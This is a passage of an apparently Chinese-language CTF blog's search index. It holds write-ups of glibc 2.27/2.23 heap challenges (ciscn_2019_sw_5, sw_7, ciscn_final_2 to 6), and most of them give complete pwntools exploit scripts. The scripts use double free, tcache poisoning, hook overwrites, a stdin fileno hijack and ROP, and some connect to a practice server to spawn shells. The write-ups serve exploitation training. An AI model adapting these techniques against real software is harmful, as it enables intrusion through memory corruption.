&#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)delete(2)delete(1)add(0x80,&#x27;\\n&#x27;) #1show()sh.recvuntil(&#x27;1: &#x27;)heap2_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap2_addr=&#x27;,hex(heap2_addr)#未初始化指针漏洞造成任意地址free，我们构造一个double freedelete(-1,&#x27;\\x00&#x27;*0x20 + p64(heap2_addr))add(0x80,p64(free_hook_addr) + &#x27;\\n&#x27;) #2add(0x80,&#x27;/bin/sh\\x00\\n&#x27;) #3add(0x80,p64(system_addr) + &#x27;\\n&#x27;)#getshelldelete(3)sh.interactive()","categories":["CTF"],"tags":["UAF","未初始化漏洞","free_hook"]},{"title":"ciscn_2019_sw_5(tcache下只有3次free限制时的巧妙利用手法)","url":"/2020/04/30/ciscn_2019_sw_5/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，仅两个功能\n\n\n其中，delete功能只能用3次，delete功能没有清空指针，存在double free漏洞。\n\n\nAdd功能，size不可控，结尾printf可以输出堆内容。\n\n\n我们可以利用add结尾的printf输出，main_arean地址，那么，我们需要得到unsorted bin才行。由于delete功能仅有3次机会。Glibc版本为2.27，存在tcache，因此，我们先利用2次，构造一个double free，然后分配到tcache 的表头，篡改对应size的chunk count为-1，同时篡改对应0x80的chunk头chunk指针为伪造的chunk地址，由于不知道堆地址，因此，我们需要爆破半个字节。\n首先，申请三个堆\n#0add(&#x27;t1&#x27;,&#x27;a&#x27;)#1add(&#x27;t2&#x27;,&#x27;b&#x27;)#2前0x18字节将划给后面伪造的0x100的chunkfake_chunk = &#x27;c&#x27;*0x8 + p64(0) + p64(0x61)add(&#x27;t3&#x27;,fake_chunk)\n\n由于，我们要在0~2之间伪造一个0x100的chunk，因此，t3的前0x18字节划分给了伪造的chunk，而要想之后成功释放这个伪造的chunk，而不报错，我们还需要把后面剩余的部分修复好，因此，在t3里，我们修复剩余的空间为0x61的chunk。\n接下来，double free，然后篡改next指针\n#double freedelete(0)delete(0)#攻击tcache bin表头add(&#x27;\\x1E\\x70&#x27;,&#x27;a&#x27;)\n\n接下来，第一次申请，申请到0原来的位置，我们开始伪造chunk\n#3伪造一个0x100的chunk，同时设置next指针仍然指向heap_base + 0x280，形成循环链表\n#3伪造一个0x100的chunk，同时设置next指针仍然指向heap_base + 0x280，形成循环链表add(&#x27;t1&#x27;,p64(heap_base + 0x280) + p64(heap_base + 0x268) + p64(0x101) + p64(heap_base + 0x270))\n\n\n我们伪造的chunk如上图，之所以这么伪造，是因为最后一次delete是要用来得到unsorted bin的，首先，当我们申请到0x280处时,0x100的tcache bin头变更为0x270。此时，我们delete掉0x100的伪造chunk后0x280处保留了main_arena地址。接下来我们申请0x270处，tcache bin头变更为0x268，我们填充数据到0x280，然后，就可以泄露出0x280处的main_arena值。接下来，我们申请到0x268，tcache bin头变更为0x280，然后我们从0x268处开始向后写数据，在0x280处写上malloc_hook的地址。此时，tcache链表的布局变成了\n0x280——malloc_hook\n因此，我们继续申请，就能申请到malloc_hook处，完成利用，十分巧妙。\n#4修改tcache bin表头，修改0x80的头为heap_base + 0x280payload = &#x27;\\x00&#x27;*0x5A + p64(heap_base + 0x280)#修改0x100的count为-1add(&#x27;\\xFF&#x27;,payload) #5#申请到heap_base + 0x280处即伪造chunkadd(&#x27;t1&#x27;,&#x27;a&#x27;) #6#得到unsorted bindelete(6)add(&#x27;a&#x27;*0x8,&#x27;a&#x27;*0x10)sh.recvuntil(&#x27;a&#x27;*0x18)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))\n\n综上，完整的exp\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget_s = 0x10a38cdef add(title,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendafter(&#x27;title:&#x27;,title)   sh.sendafter(&#x27;content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def exploit():   #0   add(&#x27;t1&#x27;,&#x27;a&#x27;)   #1   add(&#x27;t2&#x27;,&#x27;b&#x27;)   #2前0x18字节将划给后面伪造的0x100的chunk   fake_chunk = &#x27;c&#x27;*0x8 + p64(0) + p64(0x61)   add(&#x27;t3&#x27;,fake_chunk)   #double free   delete(0)   delete(0)   #攻击tcache bin表头   add(&#x27;\\x1E\\x70&#x27;,&#x27;a&#x27;)   sh.recvuntil(&#x27;\\n&#x27;)   heap_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) &amp; (0xFFFFFFFFFFFFFF00)   print &#x27;heap_base=&#x27;,hex(heap_base)   #3伪造一个0x100的chunk，同时设置next指针仍然指向heap_base + 0x280，形成循环链表   add(&#x27;t1&#x27;,p64(heap_base + 0x280) + p64(heap_base + 0x268) + p64(0x101) + p64(heap_base + 0x270))   #4修改tcache bin表头，修改0x80的头为heap_base + 0x280   payload = &#x27;\\x00&#x27;*0x5A + p64(heap_base + 0x280)   #修改0x100的count为-1   add(&#x27;\\xFF&#x27;,payload) #5   #申请到heap_base + 0x280处即伪造chunk   add(&#x27;t1&#x27;,&#x27;a&#x27;) #6   #得到unsorted bin   delete(6)   add(&#x27;a&#x27;*0x8,&#x27;a&#x27;*0x10)   sh.recvuntil(&#x27;a&#x27;*0x18)   main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))   malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)   libc_base = malloc_hook_addr - malloc_hook_s   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;error leak!&#x27;)   one_gadget_addr = libc_base + one_gadget_s   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)   print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)   #申请到heap_base+0x268处，覆盖0x280处的next指针   add(&#x27;a&#x27;,&#x27;a&#x27;*0x10 + p64(malloc_hook_addr))   add(&#x27;a&#x27;,&#x27;a&#x27;)   #改写malloc_hook   add(p64(one_gadget_addr),&#x27;\\x00&#x27;)   #getshell   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)while True:   try:      global sh      sh = process(&#x27;./ciscn_2019_sw_5&#x27;)      #sh = remote(&#x27;node3.buuoj.cn&#x27;,29046)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;","categories":["CTF"],"tags":["tcache","UAF","glibc 2.27","堆风水"]},{"title":"ciscn_2019_sw_7","url":"/2020/04/30/ciscn_2019_sw_7/","content":"首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，最多创建10个堆，并且size不能超过0x60\n\n\nDelete功能没有清空指针，因此可以double free。\n\n\n由于size受限制，因此我们需要伪造一个unsorted bin范围的chunk，glibc版本2.27，存在tcache，因此，我们还要先攻击tcache bin表头，篡改对应的count为-1，这样chunk就可以放入unsorted bin了。\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget_s = 0x10a38cdef add(size,content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;The size of note:&#x27;,str(size))   sh.sendlineafter(&#x27;The content of note:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def exploit():   #0   add(0,&#x27;a&#x27;)   #1   add(0x50,&#x27;b&#x27;)   #2   add(0,&#x27;c&#x27;)   #3   add(0x50,&#x27;d&#x27;)   #4   add(0x50,&#x27;e&#x27;)   #3、4形成链表   delete(4)   delete(3)   #通过溢出低位覆盖3的next指针低1字节为0x1B，低二字节为00，便有1/16和几率分配到tcache bin的表头0xE0的count处   delete(2)   add(0,&#x27;c&#x27;*0x8 + p64(0) + p64(0x61) + p8(0x1B - 8)) #2   add(0x50,&#x27;d&#x27;) #3   #申请到表头，修改0xE0的tcache count为-1   add(0x50,&#x27;\\x00&#x27; + p8(0xFF)) #4   #通过0溢出，修改chunk1的size，将1、2、3的size合并   payload = &#x27;a&#x27;*0x8 + p64(0) + p64(0x60 + 0x20 + 0x61)   delete(0)   add(0,payload) #0   #得到0xE0的unsorted bin   delete(1)   #将unsorted bin指针传递到chunk2里   add(0x20,&#x27;b&#x27;) #1   add(0x20,&#x27;b&#x27;) #5   show(2)   sh.recvuntil(&#x27;2 : &#x27;)   main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))   malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)   libc_base = malloc_hook_addr - malloc_hook_s   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;error leak!&#x27;)   one_gadget_addr = libc_base + one_gadget_s   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)   print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)   #3放入tcache bin   delete(3)   #将malloc_hook链接到tcache bin   add(0x60,&#x27;c&#x27;*0x18 + p64(malloc_hook_addr-0x8)) #3   #6   add(0x50,&#x27;c&#x27;)   #7写malloc_hook   add(0x50,p64(one_gadget_addr))   #getshell   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;The size of note:&#x27;,&#x27;1&#x27;)while True:   try:      global sh      #sh = process(&#x27;./ciscn_2019_sw_7&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,25167)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;","categories":["CTF"],"tags":["tcache","unsorted bin","UAF","glibc 2.27"]},{"title":"ciscn_final_2(堆利用任意地址写4字节+劫持IO流的文件描述符)","url":"/2020/04/09/ciscn_final_2/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n\n\n创建堆，我们只能写入一个4字节或2字节整数。\nShow的时候最多也只能显示4字节数据\n\n\nDelete功能没有清空指针，并且标志是共有的，因此可以通过add另外一种堆来绕过判断，造成double free。\n\n\n程序开启了沙箱保护。\n\n\n显然改one_gadget是不能的了。\n初始化函数里，打开了flag的文件描述符，并且将文件描述符复制给了666。\n\n\n退出时\n\n\nScanf会用到_IO_2_1_stdin_结构体，因此，我们可以劫持_IO_2_1_stdin_结构体，修改文件描述符为666.这样，调用scanf的时候，就会从flag文件里读取数据，然后printf输出flag的内容。\n程序给我们的glibc版本为2.27，那么可以轻松完成利用。\n#coding:utf8from pwn import *#sh = process(&#x27;./ciscn_final_2&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26759)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]stdin_filno_s = libc.sym[&#x27;_IO_2_1_stdin_&#x27;] + 0x70def add(type,number):   sh.sendlineafter(&#x27;which command?&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;TYPE:&#x27;,str(type))   sh.sendlineafter(&#x27;your inode number:&#x27;,str(number))def delete(type):   sh.sendlineafter(&#x27;which command?&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;TYPE:&#x27;,str(type))def show(type):   sh.sendlineafter(&#x27;which command?&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;TYPE:&#x27;,str(type))#0add(1,0x0ABCDEF)delete(1)#1~4for i in range(4):   add(2,0xCDEF)#构造double freedelete(2)#注意值必须设置为0，这样不影响后面的tcache堆next指针的判断add(1,0) #1delete(2)#泄露堆地址低4字节show(2)sh.recvuntil(&#x27;your short type inode number :&#x27;)heap_low_2byte = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True))if heap_low_2byte &lt; 0:   heap_low_2byte += 0x10000print &#x27;heap_low_2byte=&#x27;,hex(heap_low_2byte)#将tcahce节点的next指针指向chunk1add(2,heap_low_2byte - 0xA0)add(2,0)#1放入tcache bindelete(1)#修改chunk1的sizeadd(2,0x30 + 0x20 * 3 + 1)#不断free chunk，直到填满tcache binfor i in range(7):   delete(1)   #为了复原标志   add(2,0)#得到unsorted bindelete(1)#泄露main_arena_xx后4字节show(1)sh.recvuntil(&#x27;your int type inode number :&#x27;)main_arena_low_4byte = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True))if main_arena_low_4byte &lt; 0:   main_arena_low_4byte += 0x100000000malloc_hook_low_4byte = (main_arena_low_4byte &amp; 0xFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base_low_4byte = malloc_hook_low_4byte - malloc_hook_sstdin_filno_low_4byte =  libc_base_low_4byte + stdin_filno_sprint &#x27;libc_base_low_4byte=&#x27;,hex(libc_base_low_4byte)print &#x27;stdin_filno_low_4byte=&#x27;,hex(stdin_filno_low_4byte)#低字节覆盖tcache bin的next指针，使得其指向stdin结构体的fileno成员add(2,stdin_filno_low_4byte &amp; 0xFFFF)add(1,0)#申请到stdin_filno处，修改stdin结构体的fileno为flag文件的filenoadd(1,666)#scanf从fileno里读出数据，由于fileno被篡改，因此读取的是我们的flag文件sh.sendlineafter(&#x27;which command?&#x27;,&#x27;4&#x27;)sh.interactive()","categories":["CTF"],"tags":["UAF","glibc 2.27","IO FILE"]},{"title":"ciscn_final_3","url":"/2020/04/09/ciscn_final_3/","content":"程序给的glibc版本为2.27，存在tcache机制\n首先检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\nDelete功能存在UAF漏洞\n\n\n程序没有show的功能，但是add时，会显示堆的地址。\n\n\n为了能够泄露出glibc地址，我们就要依靠这个add时打印的堆地址。我们只要让tcache bin和unsorted bin重合，那么就能通过申请，把堆申请到main_arena处，打印堆地址时，返回的就是main_arena的地址。由于glibc版本为2.27，因此很容易利用，要得到unsorted bin范围的chunk，我们只需要篡改chunk的头部，然后多次free。\n#coding:utf8from pwn import *#sh = process(&#x27;./ciscn_final_3&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29193)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]def add(index,size,content):   sh.sendlineafter(&#x27;choice &gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;input the index&#x27;,str(index))   sh.sendlineafter(&#x27;input the size&#x27;,str(size))   sh.sendafter(&#x27;now you can write something&#x27;,content)   sh.recvuntil(&#x27;gift :&#x27;)   heap_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)   return heap_addrdef delete(index):   sh.sendlineafter(&#x27;choice &gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;input the index&#x27;,str(index))#0add(0,0x70,&#x27;a&#x27;*0x70) - 0x10#1heap_addr = add(1,0x70,&#x27;b&#x27;*0x70) - 0x10for i in range(2,10):   add(i,0x70,&#x27;c&#x27;*0x70)#10add(10,0x10,&#x27;e&#x27;*0x10)print &#x27;heap_addr=&#x27;,hex(heap_addr)#double free#多弄几个，使得size最后不会变成负数delete(0)delete(0)delete(0)delete(0)delete(0)delete(0)#修改tcache的next指针，同时，设置chunk1的prev_size域为chunk1本身的地址，这样，我们申请到chunk1的头部时,next指针就对应了prev_size域#由此继续形成了循环链表add(11,0x78,p64(heap_addr) + &#x27;a&#x27;*0x68 + p64(heap_addr + 0x10))add(12,0x70,&#x27;a&#x27;*0x70)#修改chunk1的头信息，使得1~9的大小合并add(13,0x70,p64(heap_addr) + p64(0x80*9 + 1))#获得unsorted bindelete(1)add(14,0x70,&#x27;d&#x27;)#申请到main_arena里，从而获得libc地址main_arena_xx = add(15,0x70,&#x27;e&#x27;)malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)#double freedelete(0)delete(0)add(16,0x70,p64(free_hook_addr))add(17,0x70,&#x27;/bin/sh\\x00&#x27;)#写free_hookadd(18,0x70,p64(system_addr))#getshelldelete(17)sh.interactive()","categories":["CTF"],"tags":["tcache","unsorted bin","UAF","glibc 2.27"]},{"title":"反调试+在栈上伪造堆chunk","url":"/2020/04/30/ciscn_final_4/","content":"首先，检查一下程序的保护机制，没开PIE\n\n\n沙箱禁用了execve，因此不能getshell，只能构造ROP来读取flag\n\n\n然后，我们用IDA分析一下\nDelete功能没有清空堆指针，存在UAF可以造成double free\n\n\nnew功能可以自由控制大小\n\n\n程序一开始，我们可以在栈里输入一些数据，因此，我们可以在栈里伪造一个chunk，然后利用fastbin attack申请堆到栈上，这样，我们就能控制栈了。\n\n\n我们不能接触main函数返回，因为main函数里是一个死循环，我们可以劫持其他函数。\n\n\nFastbin attack劫持new函数时，我们可以利用栈上已有的数据，来伪造size，从而绕过fastbin 分配时的size检查。\n另外，程序一开始，fork了子进程，然后利用了ptrace，导致我们无法调试它的子进程\n\n\n\n\n因此，我们需要先反调试，一个好的方法是将这里指令修改为jmp，跳过后面的fork、ptrace等操作。\n\n\n我们要跳到这里\n\n\n总共的距离为0x000000000040102F-0x0000000000400F91 &#x3D; 0x9E，因此，我们可以修改call fork指令为jmp $+0x9E，如何知道这条指令的值？我们可以利用pwntools。\n\n\n然后，我们利用十六进制编辑器，修改call fork处的指令\n\n\n重新打开IDA，发现fork等操作已经不见了\n\n\n那么，我们就可以继续来调试了，在new的rbp上方附近，有一个0x40的数据，利用错位，可以伪造成0x40的fastbin的size，从而，我们可以通过malloc(0x30)来申请到此处，进而控制该函数的执行流。但是0x30的大小，我们仅能写一两个rop指令，一个好的方法是利用add rsp,xx，来将栈迁移到下方我们可控的大空间里执行后续rop。\n\n\n综上，完整exp\n#coding:utf8from pwn import *sh = remote(&#x27;node3.buuoj.cn&#x27;,28016)#sh = process(&#x27;./ciscn_final_4&#x27;)#sh = process(&#x27;./test&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]environ_s = libc.symbols[&#x27;__environ&#x27;]fake_chunk = p64(0) + p64(0x81)payload = &#x27;a&#x27;*0xE8 + fake_chunksh.sendafter(&#x27;what is your name?&#x27;,payload)def add(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size?&#x27;,str(size))   sh.sendafter(&#x27;content?&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index ?&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index ?&#x27;,str(index))#0add(0x100,&#x27;a&#x27;*0x100)#1add(0x78,&#x27;b&#x27;*0x78)#2add(0x78,&#x27;c&#x27;*0x78)#3add(0x38,&#x27;d&#x27;*0x38)#4add(0x38,&#x27;e&#x27;*0x38)#5add(0x10,&#x27;d&#x27;*0x10)#6add(0x81,&#x27;f&#x27;*0x81)#heap_size数组的0x81数据用于伪造chunk的sizeheapsize6_addr = 0x0000000000602058note_addr = 0x00000000006020C0delete(0)show(0)sh.recvuntil(&#x27;\\n&#x27;)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_senviron_addr = libc_base + environ_spop_rdi = libc_base + 0x0000000000021102pop_rsi = libc_base + 0x00000000000202e8pop_rdx = libc_base + 0x0000000000001b92#add rsp, 0x148 ; retadd_rsp_148 = libc_base + 0x00000000000353aaopenat_addr = libc_base + libc.sym[&#x27;openat&#x27;]read_addr = libc_base + libc.sym[&#x27;read&#x27;]puts_addr = libc_base + libc.sym[&#x27;puts&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;environ_addr=&#x27;,hex(environ_addr)#double freedelete(1)delete(2)delete(1)add(0x78,p64(heapsize6_addr - 0x8)) #7add(0x78,&#x27;c&#x27;) #8add(0x78,&#x27;a&#x27;) #9#控制notesize以及note数组payload = &#x27;\\x00&#x27;*0x60payload += p64(environ_addr) #ptr0add(0x78,payload) #10#泄露栈地址show(0)sh.recvuntil(&#x27;\\n&#x27;)stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;stack_addr=&#x27;,hex(stack_addr)fake_chunk_stack_addr = stack_addr - 0x120print &#x27;fake_chunk_stack_addr=&#x27;,hex(fake_chunk_stack_addr)#利用同样的方法分配到栈上伪造的chunk#double freedelete(1)delete(2)delete(1)add(0x78,p64(fake_chunk_stack_addr)) #11add(0x78,&#x27;c&#x27;) #12add(0x78,&#x27;a&#x27;) #13#写栈add(0x78,&#x27;d&#x27;*0x11) #14#泄露canaryshow(14)sh.recvuntil(&#x27;d&#x27;*0x11)canary = u64(sh.recv(7).rjust(8,&#x27;\\x00&#x27;))print &#x27;canary=&#x27;,hex(canary)#重新分配到fake_chunk_stack_addr，布置rop#double freedelete(1)delete(2)delete(1)add(0x78,p64(fake_chunk_stack_addr)) #15add(0x78,&#x27;c&#x27;) #16add(0x78,&#x27;a&#x27;) #17#由于长度不够输入，我们调用read继续输入ropnext_rop_addr = fake_chunk_stack_addr + 0x88payload = &#x27;a&#x27;*0x40payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(next_rop_addr) + p64(pop_rdx) + p64(0x1000) + p64(read_addr)add(0x78,payload) #18#由于无法触发main函数rop，因为有一个死循环，所以我们劫持new函数来rop到main后面#接下来，分配到new函数的栈末尾处fake_chunk_stack_addr2 = stack_addr - 0x246#double freedelete(3)delete(4)delete(3)add(0x38,p64(fake_chunk_stack_addr2)) #15add(0x38,&#x27;c&#x27;) #16add(0x38,&#x27;a&#x27;) #17payload = &#x27;d&#x27;*0x6 + p64(canary) + p64(0)payload += p64(add_rsp_148) #跳到main函数后面的rop里#new函数返回到add_rsp_148进而跳到main后面的rop里add(0x38,payload)flag_addr = next_rop_addr + 0x88#openat(0,flag_addr,0)rop = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdi) + p64(0) + p64(openat_addr)#read(fd,flag_addr,0x30)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)#puts(flag_addr)rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)rop += &#x27;/flag\\x00&#x27;sleep(0.5)sh.send(rop)sh.interactive()","categories":["CTF"],"tags":["UAF","fastbin","反调试"]},{"title":"ciscn_final_5","url":"/2020/04/09/ciscn_final_5/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n程序将下标存储到了堆地址的低4位里\n\n\n[操作的时候再清除低4位地址值。]{.mark}\n\n\n问题就在于当index为16的时候，低4位已经无法表示了，这就造成了溢出\n\n\n\n\n[假如我的堆地址为0x10，我的index为16，那么，经过运算，保存的地址为0x20，这样free的时候，就是free(0x20)。因此，我们可以在堆里伪造堆]{.mark}，从而把伪造的堆给free掉。又因为glibc版本为2.27，tcache 缺少很多检查，所以可以很容易free。\n通过伪造size，free后进入对应size的tcache，然后申请回来，就能控制下方堆的内容了。改写下方chunk的fd为got表，修改got表为system地址，即可完成利用。\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./ciscn_final_5&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29906)elf = ELF(&#x27;./ciscn_final_5&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)alarm_s = libc.sym[&#x27;alarm&#x27;]alarm_got = elf.got[&#x27;alarm&#x27;]free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]def add(index,size,content):   sh.sendlineafter(&#x27;your choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;your choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def edit(index,content):   sh.sendlineafter(&#x27;your choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))   sh.sendafter(&#x27;content:&#x27;,content)#0add(0x10,0x10,p64(0) + p64(0x51))#删除伪造的chunkdelete(0)#1add(1,0x10,&#x27;a&#x27;*0x10)#2add(2,0x30,&#x27;b&#x27;*0x30)#将1放入tcache bindelete(1)#将伪造的chunk申请出来，控制chunk1的next指针为free的got表add(0,0x40,&#x27;b&#x27;*0x10 + p64(alarm_got))add(3,0x10,&#x27;c&#x27;*0x10)#申请到alarm的got表处add(4,0x10,&#x27;a&#x27;)#将2放入tcache bindelete(2)#修改2的tcache bin的next指针edit(0,&#x27;b&#x27;*0x30 + p64(free_got))add(5,0x30,&#x27;/bin/sh\\x00&#x27;)#修改free的got表为puts的plt表add(6,0x30,p64(puts_plt))#泄露alarm的地址delete(4)sh.recv(1)alarm_addr = (u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) &amp; 0xFFFFFFFFFFFFFF00) + (alarm_s &amp; 0xFF)libc_base = alarm_addr - alarm_ssystem_addr = libc_base + libc.sym[&#x27;system&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改free的got表为systemedit(14,p64(0) + p64(system_addr))#getshelldelete(5)","categories":["CTF"],"tags":["tcache","UAF","glibc 2.27"]},{"title":"ciscn_final_6","url":"/2020/06/11/ciscn_final_6/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们IDA分析一下，在store_game函数里的getInput存在null off by one漏洞\n\n\n常规的null off by one漏洞，只是本题逻辑复杂了一点，需要精心构造一下。\n#coding:utf8from pwn import*#sh = process(&#x27;./ciscn_final_6&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27827)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]def resume():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;0&#x27;)def new_game():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&quot;what&#x27;s your name?&quot;,&quot;haivk&quot;)   sh.sendlineafter(&#x27;input you ops count&#x27;,&#x27;0&#x27;)def load_game(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index?&#x27;,str(index))def store_game(size = 0,comment = &#x27;&#x27;):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)   if size == 0:      sh.sendafter(&#x27;any comment?&#x27;,&#x27;N&#x27;)   else:      sh.sendafter(&#x27;any comment?&#x27;,&#x27;Y&#x27;)      sh.sendlineafter(&#x27;comment size?&#x27;,str(size))      sh.sendafter(&#x27;plz input comment&#x27;,comment)def delete_record(index):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index?&#x27;,str(index))def show_record():   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;5&#x27;)#0new_game()store_game(0xF0,&#x27;a&#x27;*0xF0)#1new_game()store_game()#2new_game()store_game(0xF0,&#x27;a&#x27;*0xF0)#3~9for i in range(7):   new_game()   store_game(0xF0,&#x27;a&#x27;*0xF0)#10new_game()store_game()#11new_game()store_game()#12new_game()store_game()for i in range(3,10):   delete_record(i)delete_record(0)delete_record(2)#0、2~7for i in range(7):   new_game()   store_game(0xF0,&#x27;a&#x27;*0xF0)delete_record(10)#8new_game()store_game(0xF0,&#x27;a&#x27;*0xF0)#9delete_record(11)new_game()store_game(0xF0,&#x27;a&#x27;*0xF0)#10delete_record(12)new_game()#null off by onestore_game(0x18,&#x27;a&#x27;*0x10 + p64(0x100 + 0x20 + 0x30 + 0x20 + 0x30))#填满tcache bindelete_record(0)for i in range(2,8):   delete_record(i)#合并，形成overlap chunkdelete_record(9)delete_record(8)#0、2~7for i in range(7):   new_game()   store_game(0xF0,&#x27;a&#x27;*0xF0)#8，将glibc指针移动到下一个chunknew_game()store_game(0xF0,&#x27;a&#x27;*0xF0)load_game(1)sh.recvuntil(&#x27;X:&#x27;)main_arena_xx = int(sh.recvuntil(&#x27;,&#x27;,drop = True))sh.recvuntil(&#x27;Y:&#x27;)main_arena_xx = main_arena_xx + (int(sh.recvuntil(&#x27;;&#x27;,drop = 